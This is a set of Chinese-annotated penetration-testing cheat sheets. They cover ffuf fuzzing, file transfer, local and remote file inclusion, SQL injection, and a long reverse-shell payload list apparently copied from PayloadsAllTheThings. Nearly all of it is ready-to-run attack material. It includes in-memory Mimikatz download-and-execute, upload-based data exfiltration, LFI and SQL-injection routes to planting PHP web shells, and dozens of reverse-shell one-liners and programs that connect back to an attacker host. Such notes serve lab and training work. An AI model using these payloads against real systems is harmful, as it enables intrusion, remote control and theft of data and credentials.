# FFuF
|   |   |
|---|---|
|`ffuf -h`|ffuf 帮助|
|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ`|目录模糊测试|
|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ`|扩展名模糊测试|
|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php`|页面模糊测试|
|`ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v`|递归模糊测试|
|`ffuf -w wordlist.txt:FUZZ -u https://FUZZ.hackthebox.eu/`|子域名模糊测试|
|`ffuf -w wordlist.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx`|虚拟主机（VHost）模糊测试|
|`ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx`|参数模糊测试 - GET|
|`ffuf -w wordlist.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`|参数模糊测试 - POST|
|`ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx`|值模糊测试|

# Wordlists（字典）

|**Command**|**Description**|
|---|---|
|`/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt`|目录/页面字典|
|`/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt`|扩展名字典|
|`/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`|域名字典|
|`/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt`|参数字典|

source: https://academy.hackthebox.com/module/54/section/483

#ffuf #web #hacking #wordlists #cheatsheet ## File Transfer（文件传输）
| **Command** | **Description** |
| --------------|-------------------|
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | 使用 PowerShell 下载文件 |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`  | 使用 PowerShell 在内存中执行文件 |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` | 使用 PowerShell 上传文件 |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | 使用 Bitsadmin 下载文件 |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | 使用 Certutil 下载文件 |
| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | 使用 Wget 下载文件 |
| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | 使用 cURL 下载文件 |
| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | 使用 PHP 下载文件 |
| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | 使用 SCP 上传文件 |
| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | 使用 SCP 下载文件 |
| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | 使用 Chrome User Agent 的 Invoke-WebRequest |#web #hacking #lfi #rce #logpoisoning #cheatsheet
## Local File Inclusion（本地文件包含）

| **Command** | **Description** |
| --------------|-------------------|
| **Basic LFI（基础 LFI）** |
| `/index.php?language=/etc/passwd` | 基础 LFI |
| `/index.php?language=../../../../etc/passwd` | 带路径遍历的 LFI |
| `/index.php?language=/../../../etc/passwd` | 带名称前缀的 LFI |
| `/index.php?language=./languages/../../../../etc/passwd` | 带允许路径的 LFI |
| **LFI Bypasses（LFI 绕过）** |
| `/index.php?language=....//....//....//....//etc/passwd` | 绕过基础路径遍历过滤器 |
| `/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` | 使用 URL 编码绕过过滤器 |
| `/index.php?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]` | 使用路径截断绕过追加扩展名（已过时） |
| `/index.php?language=../../../../etc/passwd%00` | 使用空字节绕过追加扩展名（已过时） |
| `/index.php?language=php://filter/read=convert.base64-encode/resource=config` | 使用 base64 过滤器读取 PHP |


## Remote Code Execution（远程代码执行）

| **Command** | **Description** |
| --------------|-------------------|
| **PHP Wrappers（PHP 包装器）** |
| `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | 使用 data 包装器实现 RCE |
| `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | 使用 input 包装器实现 RCE |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"` | 使用 expect 包装器实现 RCE |
| **RFI（远程文件包含）** |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>` | 托管 web shell |
| `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id` | 包含远程 PHP web shell |
| **LFI + Upload（LFI + 上传）** |
| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif` | 创建恶意图片 |
| `/index.php?language=./profile_images/shell.gif&cmd=id` | 通过恶意上传图片实现 RCE |
| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` | 创建伪装成 jpg 的恶意 zip 压缩包 |
| `/index.php?language=zip://shell.zip%23shell.php&cmd=id` | 通过恶意上传的 zip 实现 RCE |
| `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg` | 创建伪装成 jpg 的恶意 phar |
| `/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id` | 通过恶意上传的 phar 实现 RCE |
| **Log Poisoning（日志投毒）** |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` | 读取 PHP session 参数 |
| `/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` | 用 web shell 污染 PHP session |
| `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id` | 通过被污染的 PHP session 实现 RCE |
| `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'` | 污染服务器日志 |
| `/index.php?language=/var/log/apache2/access.log&cmd=id` | 通过被污染的 PHP session 实现 RCE |


## Misc（杂项）

| **Command** | **Description** |
| --------------|-------------------|
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287` | 模糊测试页面参数 |
| `ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287` | 模糊测试 LFI 载荷 |
| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | 模糊测试 webroot 路径 |
| `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287` | 模糊测试服务器配置 |
| [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)|
| [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) |
| [Webroot path wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
| [Webroot path wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) |
| [Server configurations wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)
| [Server configurations wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows) |


## File Inclusion Functions（文件包含函数）

| **Function** | **Read Content** | **Execute** | **Remote URL** |
| ----- | :-----: | :-----: | :-----: |
| **PHP** |
| `include()`/`include_once()` | ✅ | ✅ | ✅ |
| `require()`/`require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()`/`file()` | ✅ | ❌ | ❌ |
| **NodeJS** |
| `fs.readFile()` | ✅ | ❌ | ❌ |
| `fs.sendFile()` | ✅ | ❌ | ❌ |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** |
| `include` | ✅ | ❌ | ❌ |
| `import` | ✅ | ✅ | ✅ |
| **.NET** | |
| `@Html.Partial()` | ✅ | ❌ | ❌ |
| `@Html.RemotePartial()` | ✅ | ❌ | ✅ |
| `Response.WriteFile()` | ✅ | ❌ | ❌ |
| `include` | ✅ | ✅ | ✅ |# SQL Injection（SQL 注入）
## MySQL

| **Command**   | **Description**   |
| --------------|-------------------|
| **General（通用）** |
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | 登录 mysql 数据库 |
| `SHOW DATABASES` | 列出可用数据库 |
| `USE users` | 切换到数据库 |
| **Tables（表）** |
| `CREATE TABLE logins (id INT, ...)` | 添加新表 |
| `SHOW TABLES` | 列出当前数据库中的可用表 |
| `DESCRIBE logins` | 显示表属性和列 |
| `INSERT INTO table_name VALUES (value_1,..)` | 向表中添加值 |
| `INSERT INTO table_name(column2, ...) VALUES (column2_value, ..)` | 向表中特定列添加值 |
| `UPDATE table_name SET column1=newvalue1, ... WHERE <condition>` | 更新表中的值 |
| **Columns（列）** |
| `SELECT * FROM table_name` | 显示表中所有列 |
| `SELECT column1, column2 FROM table_name` | 显示表中特定列 |
| `DROP TABLE logins` | 删除表 |
| `ALTER TABLE logins ADD newColumn INT` | 添加新列 |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | 重命名列 |
| `ALTER TABLE logins MODIFY oldColumn DATE` | 更改列数据类型 |
| `ALTER TABLE logins DROP oldColumn` | 删除列 |
| **Output（输出）** |
| `SELECT * FROM logins ORDER BY column_1` | 按列排序 |
| `SELECT * FROM logins ORDER BY column_1 DESC` | 按列降序排序 |
| `SELECT * FROM logins ORDER BY column_1 DESC, id ASC` | 按两列排序 |
| `SELECT * FROM logins LIMIT 2` | 只显示前两条结果 |
| `SELECT * FROM logins LIMIT 1, 2` | 从索引 2 开始只显示前两条结果 |
| `SELECT * FROM table_name WHERE <condition>` | 列出满足条件的结果 |
| `SELECT * FROM logins WHERE username LIKE 'admin%'` | 列出名称与给定字符串相似的结果 |

## MySQL Operator Precedence（MySQL 运算符优先级）
* 除法 (`/`)、乘法 (`*`) 和取模 (`%`)
* 加法 (`+`) 和减法 (`-`)
* 比较 (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
* NOT (`!`)
* AND (`&&`)
* OR (`||`)

## SQL Injection（SQL 注入）
| **Payload**   | **Description**   |
| --------------|-------------------|
| **Auth Bypass（认证绕过）** |
| `admin' or '1'='1` | 基础认证绕过 |
| `admin')-- -` | 带注释的基础认证绕过 |
| [Auth Bypass Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) |
| **Union Injection（联合注入）** |
| `' order by 1-- -` | 使用 `order by` 检测列数 |
| `cn' UNION select 1,2,3-- -` | 使用 Union 注入检测列数 |
| `cn' UNION select 1,@@version,3,4-- -` | 基础 Union 注入 |
| `UNION select username, 2, 3, 4 from passwords-- -` | 4 列的 Union 注入 |
| **DB Enumeration（数据库枚举）** |
| `SELECT @@version` | 通过查询输出识别 MySQL |
| `SELECT SLEEP(5)` | 无输出时识别 MySQL |
| `cn' UNION select 1,database(),2,3-- -` | 当前数据库名称 |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | 列出所有数据库 |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | 列出特定数据库中的所有表 |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | 列出特定表中的所有列 |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | 从另一个数据库的表中转储数据 |
| **Privileges（权限）** |
| `cn' UNION SELECT 1, user(), 3, 4-- -` | 查找当前用户 |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | 查找用户是否有管理员权限 |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -` | 查找所有用户权限 |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | 查找可以通过 MySQL 访问的目录 |
| **File Injection（文件注入）** |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | 读取本地文件 |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | 将字符串写入本地文件 |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | 将 web shell 写入基础 web 目录 |#shell #webshell #reverseshell #cheatsheet #hacking #php #python #powershell [source](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#start-of-content)

# Shells（Shell）

更多有用资源：

1. [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master)
2. /[Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)

# Reverse Shell Cheatsheet.md（反向 Shell 速查表）

## [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#tools)Tools（工具）

- [reverse-shell-generator](https://www.revshells.com/) - 托管的反向 Shell 生成器 ([source](https://github.com/0dayCTF/reverse-shell-generator)) [![image](https://user-images.githubusercontent.com/44453666/115149832-d6a75980-a033-11eb-9c50-56d4ea8ca57c.png)](https://user-images.githubusercontent.com/44453666/115149832-d6a75980-a033-11eb-9c50-56d4ea8ca57c.png)
- [revshellgen](https://github.com/t0thkr1s/revshellgen) - CLI 反向 Shell 生成器

## [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#reverse-shell)Reverse Shell（反向 Shell）

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)Bash TCP

```shell
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-udp)Bash UDP

```shell
Victim:
sh -i >& /dev/udp/10.0.0.1/4242 0>&1

Listener:
nc -u -lvp 4242
```

不要忘记尝试其他 shell：sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#socat)Socat

```powershell
user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242
user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```

```powershell
user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```

静态 socat 二进制文件可在 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat) 找到

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl)Perl

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'


NOTE: Windows only
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)Python

仅限 Linux

IPv4

```python
export RHOST="10.0.0.1";export RPORT=4242;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```python
python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

IPv4（无空格）

```python
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```python
python -c 'socket=__import__("socket");subprocess=__import__("subprocess");os=__import__("os");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```python
python -c 'socket=__import__("socket");subprocess=__import__("subprocess");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

IPv4（无空格，缩短版）

```python
python -c 'a=__import__;s=a("socket");o=a("os").dup2;p=a("pty").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect(("10.0.0.1",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

```python
python -c 'a=__import__;b=a("socket");p=a("subprocess").call;o=a("os").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("10.0.0.1",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
```

```python
python -c 'a=__import__;b=a("socket");c=a("subprocess").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect(("10.0.0.1",4242));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
```

IPv4（无空格，进一步缩短版）

```python
python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("10.0.0.1",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

```python
python -c 'a=__import__;b=a("socket").socket;p=a("subprocess").call;o=a("os").dup2;s=b();s.connect(("10.0.0.1",4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(["/bin/sh","-i"])'
```

```python
python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("10.0.0.1",4242));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
```

IPv6

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

IPv6（无空格）

```python
python -c 'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

IPv6（无空格，缩短版）

```python
python -c 'a=__import__;c=a("socket");o=a("os").dup2;p=a("pty").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

仅限 Windows（Python2）

```powershell
python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

仅限 Windows（Python3）

```powershell
python.exe -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('10.0.0.1',4242));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php)PHP

```shell
php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

```shell
php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ruby)Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.0.0.1","4242");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'

NOTE: Windows only
ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#rust)Rust

```rust
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

fn main() {
    let s = TcpStream::connect("10.0.0.1:4242").unwrap();
    let fd = s.as_raw_fd();
    Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#golang)Golang

```shell
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional)Netcat Traditional（传统 Netcat）

```shell
nc -e /bin/sh 10.0.0.1 4242
nc -e /bin/bash 10.0.0.1 4242
nc -c bash 10.0.0.1 4242
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd)Netcat OpenBsd

```shell
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-busybox)Netcat BusyBox

```shell
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ncat)Ncat

```shell
ncat 10.0.0.1 4242 -e /bin/bash
ncat --udp 10.0.0.1 4242 -e /bin/bash
```

### [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#openssl)OpenSSL

攻击者：

```powershell
user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
or
user@attack$ ncat --ssl -vv -l -p 4242

user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s
```

TLS-PSK（不依赖 PKI 或自签名证书）

```shell
# generate 384-bit PSK
# use the generated string as a value for the two PSK variables from below
openssl rand -hex 48
# server (attacker)
export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; openssl s_server -quiet -tls1_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT
# client (victim)
export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
```

